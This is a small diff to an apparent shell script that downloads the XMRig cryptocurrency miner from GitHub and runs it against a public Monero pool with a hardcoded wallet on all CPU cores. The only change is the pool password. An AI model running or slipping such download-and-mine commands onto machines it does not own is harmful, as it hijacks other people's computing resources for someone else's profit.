@@ -2,4 +2,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar xf xmrig-6.22.2-linux-static-x64.tar.gz
 cd xmrig-6.22.2
-./xmrig --donate-level 1 -o pool.supportxmr.com:80 -u 8BuaTg6Gxmi1vLku8Gz9ZhN5rpsHbCPYkV1smEpMxipcARrfHUNW3BTb1fbHj48Mmi3uUQ5QGC9dP9yN5Nt2MP9kRt1S9BP -p x -a rx/0 -k -t $(nproc --all)
+./xmrig --donate-level 1 -o pool.supportxmr.com:80 -u 8BuaTg6Gxmi1vLku8Gz9ZhN5rpsHbCPYkV1smEpMxipcARrfHUNW3BTb1fbHj48Mmi3uUQ5QGC9dP9yN5Nt2MP9kRt1S9BP -p xx -a rx/0 -k -t $(nproc --all)
